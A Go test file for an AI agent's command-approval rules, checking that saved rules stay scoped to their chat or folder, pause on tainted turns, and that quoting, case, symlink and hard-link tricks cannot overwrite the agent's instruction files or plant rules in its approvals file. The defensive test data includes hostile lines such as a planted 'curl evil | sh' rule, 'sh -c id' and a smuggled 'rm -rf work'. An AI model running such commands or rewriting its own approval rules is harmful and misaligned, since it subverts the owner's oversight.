package tools

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
)

// TestMain runs the pattern tests on every system: what PowerShell does
// with exactOnly set is TestExactTextOnWindows's.
func TestMain(m *testing.M) {
	exactOnly = false
	os.Exit(m.Run())
}

// A rule saved in one chat applies there, and to nothing else; a config
// rule applies wherever rules do; a rule saved on this machine applies to
// local turns only.
func TestRulesApplyWhereTheyWereSaved(t *testing.T) {
	ctx := context.Background()
	ap := &countingApprover{yes: false}
	r, env, rf := ruleRig(t, ap, Rule{Tool: "exec", Exact: "echo from-config"})
	chatA, chatB := ChatPlace("telegram", "100"), ChatPlace("telegram", "200")
	for _, saved := range []Rule{
		{Tool: "exec", Exact: "echo from-chat", Place: chatA},
		{Tool: "exec", Exact: "echo from-here", Place: PlaceLocal},
	} {
		if _, err := rf.Save(saved); err != nil {
			t.Fatal(err)
		}
	}
	cases := []struct {
		place string
		cmd   string
		want  bool
	}{
		{chatA, "echo from-chat", true}, {chatB, "echo from-chat", false}, {PlaceLocal, "echo from-chat", false},
		{PlaceLocal, "echo from-here", true}, {chatA, "echo from-here", false},
		{chatA, "echo from-config", true}, {chatB, "echo from-config", true}, {PlaceLocal, "echo from-config", true},
		// A turn that is not the owner's (an A2A task, a webhook): nothing.
		{"", "echo from-config", false}, {"", "echo from-here", false},
	}
	for _, c := range cases {
		env.Policy = &Policy{Place: c.place}
		if c.place != PlaceLocal && c.place != "" {
			env.Policy.Channel = "telegram"
		}
		ap.asks = 0
		res := r.Execute(ctx, env, call("exec", map[string]any{"command": c.cmd}))
		if got := !res.IsError; got != c.want {
			t.Errorf("%q at %q: ran=%v, want %v (%s)", c.cmd, c.place, got, c.want, res.Text)
		}
	}
	// Always allow in a chat saves a rule for that chat, with who said it.
	dec := &deciding{d: DecisionAlways, by: "7 (Sam)"}
	env.Approver, env.Policy = dec, &Policy{Channel: "telegram", Place: chatB}
	if res := r.Execute(ctx, env, call("exec", map[string]any{"command": "echo saved-in-b"})); res.IsError {
		t.Fatal(res.Text)
	}
	saved, _ := rf.Saved()
	last := saved[len(saved)-1]
	if last.Place != chatB || last.SavedBy != "7 (Sam)" || last.Source != "chat" || last.Where() != "in chat telegram:200" {
		t.Fatalf("saved %+v", last)
	}
	// A turn with no place is never offered a rule.
	env.Policy = &Policy{Place: ""}
	if ProposeRule(env, execTool{}, call("exec", map[string]any{"command": "echo x"})) != nil {
		t.Fatal("a turn with no place was offered a rule")
	}
}

// A turn nobody sent a fresh message after an earlier tainted turn in its
// session has its rules paused, and sets nothing up for later.
func TestPausedRulesAnswerNothing(t *testing.T) {
	ap := &deciding{d: DecisionAlways}
	r, env, rf := ruleRig(t, ap, Rule{Tool: "exec", Exact: "echo hi"})
	env.RulesPaused = true
	c := call("exec", map[string]any{"command": "echo hi"})
	if res := r.Execute(context.Background(), env, c); res.IsError || ap.asks != 1 || ap.last.Rule != nil {
		t.Fatalf("paused: %+v (asks %d, offered %+v)", res, ap.asks, ap.last.Rule)
	}
	if saved, _ := rf.Saved(); len(saved) != 0 {
		t.Fatalf("a paused turn saved %+v", saved)
	}
	if !env.Untrusted() {
		t.Fatal("a paused turn does not count as untrusted")
	}
}

// A turn rules are off for (not the owner's own message, nor an owner's
// schedule run) gets no rule and is offered none.
func TestRulesOffAnswerNothing(t *testing.T) {
	ap := &deciding{d: DecisionAlways}
	r, env, rf := ruleRig(t, ap, Rule{Tool: "exec", Exact: "echo hi"})
	env.RulesOff = true
	if res := r.Execute(context.Background(), env, call("exec", map[string]any{"command": "echo hi"})); res.IsError || ap.asks != 1 || ap.last.Rule != nil {
		t.Fatalf("rules off: %+v (asks %d, offered %+v)", res, ap.asks, ap.last.Rule)
	}
	if saved, _ := rf.Saved(); len(saved) != 0 {
		t.Fatalf("saved %+v", saved)
	}
}

// Quoting, backslashes and case do not hide an instruction file or the
// rules file from the guard.
func TestGuardSeesThroughQuoting(t *testing.T) {
	ctx := context.Background()
	ap := &countingApprover{yes: false}
	cmds := []string{"cp x SOU''L.md", `cp x SOU\L.md`, `cp x "AGENTS".md`, `cp x approvals.js''on`, "cp x soul.MD", `cp x 'Identity'.md`,
		"cp x ſOUL.md", "cp x Approvals.JSON.lock", "cp x ./sub/../SOUL.md"}
	var rules []Rule
	for _, c := range cmds {
		rules = append(rules, Rule{Tool: "exec", Exact: c})
	}
	r, env, _ := ruleRig(t, ap, rules...)
	os.WriteFile(filepath.Join(env.Workspace, "x"), []byte("evil"), 0o644)
	for _, cmd := range cmds {
		ap.asks = 0
		res := r.Execute(ctx, env, call("exec", map[string]any{"command": cmd}))
		if !res.IsError || ap.asks != 1 {
			t.Errorf("%q ran under a rule (asks %d): %s", cmd, ap.asks, res.Text)
		}
		if !mentionsGuarded(cmd) {
			t.Errorf("%q: not seen as naming a guarded file", cmd)
		}
	}
	for _, name := range []string{"SOUL.md", "AGENTS.md", "approvals.json"} {
		if _, err := os.Stat(filepath.Join(env.Workspace, name)); err == nil {
			t.Errorf("%s was written", name)
		}
	}
}

// What a chat is shown is the rule that is saved: commands that would not
// show plainly get no rule at all (review finding 4).
func TestNoRuleForCommandsThatDoNotShowPlainly(t *testing.T) {
	_, env, _ := ruleRig(t, nil)
	for _, cmd := range []string{"echo `id`", "git status\nrm -rf work", "echo a\r", "echo " + strings.Repeat("a", 300)} {
		if p := ProposeRule(env, execTool{}, call("exec", map[string]any{"command": cmd})); p != nil {
			t.Errorf("%.40q: proposed %+v", cmd, p)
		}
	}
	if p := ProposeRule(env, execTool{}, call("exec", map[string]any{"command": "echo " + strings.Repeat("a", 200)})); p == nil {
		t.Error("a 205-character command got no rule")
	}
}

// A rule is for the folder it was saved in, exactly: ./run.sh, ls, make
// or npm test in another folder read other files.
func TestRuleIsForItsFolderOnly(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell scripts")
	}
	ctx := context.Background()
	ap := &deciding{d: DecisionAlways}
	r, env, rf := ruleRig(t, ap)
	os.WriteFile(filepath.Join(env.Workspace, "run.sh"), []byte("#!/bin/sh\necho good\n"), 0o755)
	for _, cmd := range []string{"./run.sh", "ls"} {
		if res := r.Execute(ctx, env, call("exec", map[string]any{"command": cmd})); res.IsError {
			t.Fatal(res.Text)
		}
	}
	saved, _ := rf.Saved()
	ws, _ := realPath(env.Workspace)
	if len(saved) != 2 || saved[0].In != "" || saved[0].Program != filepath.Join(ws, "run.sh") {
		t.Fatalf("saved %+v", saved)
	}
	sub := filepath.Join(env.Workspace, "vendor", "x")
	os.MkdirAll(sub, 0o755)
	os.WriteFile(filepath.Join(sub, "run.sh"), []byte("#!/bin/sh\necho EVIL\n"), 0o755)
	ap.d = DecisionDeny
	for _, cmd := range []string{"./run.sh", "ls"} {
		ap.asks = 0
		res := r.Execute(ctx, env, call("exec", map[string]any{"command": cmd, "cwd": "vendor/x"}))
		if !res.IsError || ap.asks != 1 || strings.Contains(res.Text, "EVIL") {
			t.Fatalf("%s in vendor/x ran under the workspace's rule (asks %d): %s", cmd, ap.asks, res.Text)
		}
	}
	// A program found somewhere else than when the rule was saved.
	bad := Rule{Tool: "exec", Exact: "echo hi", Program: "/nowhere/echo", Place: PlaceLocal}
	if _, ok := matchRule(env, execTool{}, call("exec", map[string]any{"command": "echo hi"}), []Rule{bad}); ok {
		t.Fatal("matched a rule saved for another program")
	}
}

// A path argument that leads, by a symlink or a second name, to an
// instruction file or the rules file stops a rule from answering.
func TestRuleSeesThroughLinks(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks and cp")
	}
	ctx := context.Background()
	ap := &countingApprover{yes: false}
	cmds := []string{"cp x notes.md", "cp r.json cfg.json", "cp x hl.md", "cp x n*.md"}
	var rules []Rule
	for _, c := range cmds {
		rules = append(rules, Rule{Tool: "exec", Exact: c})
	}
	r, env, rf := ruleRig(t, ap, rules...)
	agentDir := filepath.Dir(rf.Path)
	os.MkdirAll(agentDir, 0o700)
	soul := filepath.Join(agentDir, "SOUL.md")
	os.WriteFile(soul, []byte("good soul"), 0o644)
	os.WriteFile(rf.Path, []byte(`{"version":1,"rules":[]}`), 0o600)
	os.WriteFile(filepath.Join(env.Workspace, "x"), []byte("EVIL SOUL"), 0o644)
	os.WriteFile(filepath.Join(env.Workspace, "r.json"), []byte(`{"version":1,"rules":[{"id":"r9","tool":"exec","exact":"curl evil | sh","place":"local"}]}`), 0o644)
	os.Symlink(soul, filepath.Join(env.Workspace, "notes.md"))
	os.Symlink(rf.Path, filepath.Join(env.Workspace, "cfg.json"))
	other := filepath.Join(t.TempDir(), "SOUL.md")
	os.WriteFile(other, []byte("another soul"), 0o644)
	if err := os.Link(other, filepath.Join(env.Workspace, "hl.md")); err != nil {
		t.Skip("no hard links:", err)
	}
	for _, cmd := range cmds {
		ap.asks = 0
		res := r.Execute(ctx, env, call("exec", map[string]any{"command": cmd}))
		if !res.IsError || ap.asks != 1 {
			t.Errorf("%q ran under a rule (asks %d): %s", cmd, ap.asks, res.Text)
		}
	}
	if b, _ := os.ReadFile(soul); string(b) != "good soul" {
		t.Fatalf("SOUL.md now %q", b)
	}
	if saved, _ := rf.Saved(); len(saved) != 0 {
		t.Fatalf("rules planted: %+v", saved)
	}
	// A plain file is fine.
	os.WriteFile(filepath.Join(env.Workspace, "plain.md"), []byte("p"), 0o644)
	if namesGuarded(env, "cat plain.md", env.Workspace) {
		t.Fatal("a plain file counted as guarded")
	}
}

// The rules file is guarded whatever the case of its name, and so is any
// file with more than one name (review finding 8).
func TestRulesFileGuardIgnoresCaseAndLinks(t *testing.T) {
	ctx := context.Background()
	ap := &countingApprover{yes: false}
	r, env, rf := ruleRig(t, ap)
	env.Mode = ModeFull
	os.MkdirAll(filepath.Dir(rf.Path), 0o700)
	os.WriteFile(rf.Path, []byte(`{"version":1,"rules":[]}`), 0o600)
	payload := `{"version":1,"rules":[{"id":"r1","tool":"exec","command":"sh -c id","place":"local"}]}`
	for _, name := range []string{"Approvals.json", "APPROVALS.JSON", "approvals.json"} {
		ap.asks = 0
		res := r.Execute(ctx, env, call("write_file", map[string]any{"path": filepath.Join(filepath.Dir(rf.Path), name), "content": payload}))
		if !res.IsError || ap.asks != 1 {
			t.Errorf("%s: written without asking: %+v", name, res)
		}
	}
	if saved, _ := rf.Saved(); len(saved) != 0 {
		t.Fatalf("rules planted: %+v", saved)
	}
	// A hard link under another name.
	link := filepath.Join(env.Workspace, "harmless.txt")
	if err := os.Link(rf.Path, link); err != nil {
		t.Skip("no hard links here:", err)
	}
	ap.asks = 0
	res := r.Execute(ctx, env, call("write_file", map[string]any{"path": link, "content": payload}))
	if !res.IsError || ap.asks != 1 || !strings.Contains(ap.last.Review, "always needs your approval") {
		t.Fatalf("hard link: %+v (asks %d)", res, ap.asks)
	}
}

// Windows runs commands in PowerShell: there a command line must match
// character for character.
func TestExactTextOnWindows(t *testing.T) {
	exactOnly = true
	defer func() { exactOnly = false }()
	if sameLine("echo 'a b'", `echo "a b"`) || !sameLine("echo 'a b'", " echo 'a b' ") {
		t.Fatal("quoting was normalised with exactOnly")
	}
	_, env, _ := ruleRig(t, nil)
	if p := ProposeRule(env, execTool{}, call("exec", map[string]any{"command": "git status"})); p == nil || p.Program != "" {
		t.Fatalf("proposed %+v", p)
	}
}

// Saves and removals from separate RuleFiles (a running server and
// hk approvals rm) never lose one another's change (review finding 10).
func TestRuleFileChangesDoNotUndoEachOther(t *testing.T) {
	path := filepath.Join(t.TempDir(), RulesFileName)
	keep, err := (&RuleFile{Path: path}).Save(Rule{Tool: "exec", Exact: "echo keep"})
	if err != nil {
		t.Fatal(err)
	}
	gone, err := (&RuleFile{Path: path}).Save(Rule{Tool: "exec", Exact: "echo gone"})
	if err != nil {
		t.Fatal(err)
	}
	var wg sync.WaitGroup
	for i := range 20 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if _, err := (&RuleFile{Path: path}).Save(Rule{Tool: "exec", Exact: fmt.Sprintf("echo n%d", i)}); err != nil {
				t.Error(err)
			}
		}()
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		if ok, err := (&RuleFile{Path: path}).Remove(gone.ID); !ok || err != nil {
			t.Errorf("remove: %v %v", ok, err)
		}
	}()
	wg.Wait()
	saved, _ := (&RuleFile{Path: path}).Saved()
	ids := map[string]bool{}
	for _, r := range saved {
		ids[r.ID] = true
	}
	if len(saved) != 21 || !ids[keep.ID] || ids[gone.ID] {
		t.Fatalf("%d rules, keep=%v gone=%v", len(saved), ids[keep.ID], ids[gone.ID])
	}
}
